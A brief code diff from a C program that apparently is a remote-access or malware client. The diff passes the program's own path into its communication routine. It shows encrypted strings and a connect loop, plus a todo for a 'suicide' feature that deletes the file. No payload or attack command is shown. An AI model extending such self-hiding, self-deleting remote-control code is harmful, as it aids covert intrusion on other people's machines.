@@ -6,7 +6,7 @@
 // todo: maybe make the features more toggleable
 // todo: add stop option to stop the accept loop, maybe also suicide to delete the physical file.
 
-int main() {
+int main(const int argc, const char *const argv[]) {
     INITIALIZE_RESULT(res);
 
     decrypt_strings();
@@ -27,7 +27,7 @@ int main() {
         HANDLE_ERROR_RESULT(res)
 
         WRITE_LOG(WARNING, "Connected", NULL)
-        res = communicate();
+        res = communicate(argv[0]);
         WRITE_LOG(WARNING, "Disconnected", NULL)
 
         disconnect();
